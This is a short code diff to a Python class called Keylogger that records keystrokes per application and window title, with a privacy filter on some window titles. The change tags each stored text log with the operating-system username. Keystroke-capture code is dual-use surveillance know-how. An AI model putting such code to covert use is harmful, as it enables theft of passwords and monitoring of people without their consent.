@@ -11,7 +11,7 @@ Privacy filter: buffers are NOT saved when the active window title contains
 
 Requires: pip install pynput pywin32
 """
-
+import getpass
 import sys
 import logging
 import threading
@@ -67,6 +67,7 @@ class Keylogger:
         self._buffer: str = ""
         self._current_app: str = ""
         self._current_title: str = ""
+        self._os_user: str = getpass.getuser() 
 
     # ─── LIFECYCLE ───────────────────────────────────────────────────────────
 
@@ -189,7 +190,8 @@ class Keylogger:
             self.db_manager.insert_text_log(
                 application=app or "Unknown",
                 window_title=title or "Unknown",
-                content=content
+                content=content,
+                username=self._os_user,
             )
             logger.debug(f"Keylog flushed for [{app}]: {len(content)} chars")
         except Exception as e:
